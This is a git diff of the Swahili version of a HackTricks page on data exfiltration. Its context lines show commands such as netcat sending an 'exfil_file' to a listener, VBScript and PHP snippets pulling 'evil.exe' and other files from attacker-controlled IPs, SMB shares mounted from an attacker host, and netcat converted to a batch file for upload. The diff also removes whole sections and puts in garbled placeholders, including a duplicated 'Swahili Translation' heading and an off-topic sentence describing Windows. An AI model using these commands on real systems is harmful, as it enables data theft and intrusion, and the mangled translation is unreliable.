@@ -1,20 +1,21 @@
 # Kufyonza
 
+{% hint style="success" %}
+Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**Kikundi cha Usalama cha Kujitahidi Kwa Bidii**
+**Kikundi cha Usalama cha Kujitahidi**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -24,7 +25,7 @@ Njia nyingine za kusaidia HackTricks:
 
 ## Vyanzo vya kawaida vilivyoorodheshwa kwa ajili ya kufyonza taarifa
 
-Angalia [https://lots-project.com/](https://lots-project.com/) kupata vyanzo vya kawaida vilivyoorodheshwa ambavyo vinaweza kutumiwa vibaya
+Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata vyanzo vya kawaida vilivyoorodheshwa ambavyo vinaweza kutumiwa vibaya
 
 ## Nakili\&Banda la Msingi wa 64
 
@@ -170,7 +171,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Au unaweza kuunda smb share **kwa kutumia samba**:
+Au tengeneza sehemu ya smb **kwa kutumia samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -185,19 +186,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-### Exfiltration Techniques on Windows
-
-#### Exfiltration Over C2 Channels
-When exfiltrating data over command and control (C2) channels, an attacker can leverage existing C2 infrastructure to blend in with legitimate traffic. This can include using encrypted channels, steganography, or other obfuscation techniques to avoid detection.
-
-#### Exfiltration Over Alternative Protocols
-Attackers can also exfiltrate data using alternative protocols such as DNS, ICMP, or HTTP. By encoding data within the protocol traffic, an attacker can bypass network security controls that may only be inspecting specific protocols.
-
-#### Exfiltration Over Trusted Protocols
-Utilizing trusted protocols like HTTPS or DNS can help an attacker blend in with normal network traffic. By abusing these protocols to exfiltrate data, an attacker can avoid raising suspicion from security monitoring tools.
-
-#### Exfiltration Over Encrypted Channels
-Encrypting exfiltrated data can help evade detection by security tools that are not able to inspect encrypted traffic. By using encryption, an attacker can make it more challenging for defenders to identify and block exfiltration attempts.
+Windows ni mfumo wa uendeshaji uliotengenezwa na Microsoft. Ni mojawapo ya mifumo maarufu zaidi duniani kwa kompyuta za kibinafsi.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -221,40 +210,8 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Exfiltration
-
-#### Overview
-
-Exfiltration is the unauthorized transfer of data from a target. This can be achieved through various methods, such as:
-
-- **Email**: Sending sensitive data as email attachments.
-- **FTP**: Transferring data using File Transfer Protocol.
-- **DNS**: Sending data through DNS requests.
-- **HTTP/HTTPS**: Using HTTP or HTTPS protocols to exfiltrate data.
-- **Steganography**: Hiding data within other files to avoid detection.
-- **Physical**: Removing data physically from a target location.
-
-#### Detection
-
-Detecting exfiltration can be challenging due to the covert nature of the activity. Some common detection methods include:
-
-- **Network Monitoring**: Monitoring network traffic for unusual patterns.
-- **Endpoint Monitoring**: Monitoring endpoint devices for unauthorized data transfers.
-- **Data Loss Prevention (DLP)**: Using DLP solutions to detect and prevent data exfiltration.
-- **Behavioral Analytics**: Analyzing user behavior to identify suspicious activities.
-- **Encryption**: Implementing encryption to protect data from being exfiltrated.
-
-#### Prevention
-
-Preventing exfiltration requires a multi-layered approach to security. Some prevention techniques include:
-
-- **Access Control**: Limiting access to sensitive data to authorized personnel only.
-- **Network Segmentation**: Segmenting networks to prevent lateral movement of attackers.
-- **User Training**: Educating users about the risks of data exfiltration and how to prevent it.
-- **Security Policies**: Implementing strict security policies to govern data handling practices.
-- **Security Tools**: Deploying security tools such as firewalls, IDS/IPS, and SIEM solutions to detect and prevent exfiltration attempts.
-
-By understanding exfiltration techniques and implementing appropriate detection and prevention measures, organizations can better protect their data from unauthorized access and transfer.
+### Swahili Translation
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -295,13 +252,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP kupokea data hiyo kwa kutumia python:
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ili kupokea data na python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Kwa chaguo-msingi katika XP na 2003 (katika mingine inahitaji kuongezwa wazi wakati wa usakinishaji)
+Kwa chaguo-msingi katika XP na 2003 (katika wengine inahitaji kuongezwa wazi wakati wa usakinishaji)
 
 Katika Kali, **anzisha seva ya TFTP**:
 ```bash
@@ -327,7 +284,8 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript ni lugha ya programu inayotumika sana kwa maendeleo ya skripti za Windows. Inaweza kutumika kwa ufanisi kutekeleza shughuli za uhamishaji wa data kwa njia ya exfiltration.
+### Swahili Translation
+## VBScript
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -365,13 +323,14 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa binaries lakini pia ina **uwezo wa kujenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Hata hivyo, ni muhimu kuzingatia kwamba debug.exe ina **kizuizi cha kuunda faili hadi 64 kb in size**.
+Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa binaries lakini pia ina **uwezo wa kujenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Walakini, ni muhimu kufahamu kwamba debug.exe ina **kizuizi cha kuunda faili hadi 64 kb in size**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kisha nakili na ushirikishe maudhui kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
+```markdown
+Kisha nakili na kubandika maandishi kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -385,16 +344,18 @@ Kisha nakili na ushirikishe maudhui kwenye windows-shell na faili inayoitwa nc.e
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
+```
